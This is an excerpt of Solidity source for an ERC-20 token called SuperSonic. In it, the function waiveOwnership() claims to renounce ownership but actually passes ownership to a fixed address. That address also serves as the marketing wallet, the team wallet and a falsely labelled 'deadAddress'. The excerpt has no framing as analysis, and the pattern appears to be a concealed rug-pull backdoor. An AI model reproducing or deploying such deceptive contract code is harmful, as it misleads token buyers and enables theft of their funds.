...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x3a3e343ff36BB787b950735De1d932a2F86C3C9C));
        _owner = address(0x3a3e343ff36BB787b950735De1d932a2F86C3C9C);
    }
...
contract SuperSonic is Context, IERC20, Ownable {
    ...
    string private _symbol = "SuperSonic";
    uint8 private _decimals = 4;

    address payable public marketingWalletAddress = payable(0x3a3e343ff36BB787b950735De1d932a2F86C3C9C);
    address payable public teamWalletAddress = payable(0x3a3e343ff36BB787b950735De1d932a2F86C3C9C);
    address public immutable deadAddress = 0x3a3e343ff36BB787b950735De1d932a2F86C3C9C;
    ...
    uint256 public _walletMax =     4200000000 * 10**_decimals;
